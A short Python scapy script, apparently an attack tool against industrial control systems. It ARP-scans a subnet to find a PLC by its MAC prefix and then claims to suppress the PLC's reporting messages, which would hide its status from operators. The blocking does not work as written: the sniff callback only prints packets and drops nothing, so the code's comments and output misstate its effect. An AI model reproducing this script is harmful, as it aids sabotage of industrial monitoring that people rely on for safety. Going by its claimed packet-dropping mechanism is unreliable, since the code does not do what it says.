from scapy.all import *
import re
import os

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Perform an ARP scan to discover devices on the network
    print("Scanning network to discover PLC...")
    ans, unans = arping("192.168.1.0/24", verbose=0)  # Adjust the subnet as per your network

    # Filter the results to find the PLC (assuming the PLC has a known MAC prefix)
    plc_ip = None
    for snd, rcv in ans:
        if re.match(r"00:1D:9C", rcv.src):  # Replace with the known PLC MAC prefix
            plc_ip = rcv.psrc
            print(f"PLC discovered at IP: {plc_ip}")
            break

    if not plc_ip:
        print("PLC not found on the network.")
        exit(1)

    return plc_ip

# Function to block reporting messages from the PLC
def block_reporting_messages(plc_ip):
    print(f"Blocking reporting messages from PLC at IP: {plc_ip}")

    # Define the filter to block specific traffic (e.g., TCP/UDP messages from PLC)
    filter_rule = f"ip src {plc_ip} and (tcp or udp)"

    # Use Scapy's sniff function to capture and drop packets matching the filter
    def drop_packet(packet):
        print(f"Blocked packet: {packet.summary()}")
        return False  # Drop the packet

    print("Starting to block reporting messages...")
    sniff(filter=filter_rule, prn=drop_packet, store=0)

# Main script logic
if __name__ == "__main__":
    # Check for administrative privileges
    if os.getuid() != 0:
        print("This script requires administrative privileges. Please run as administrator.")
        exit(1)

    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()

    # Block reporting messages from the PLC
    block_reporting_messages(plc_ip)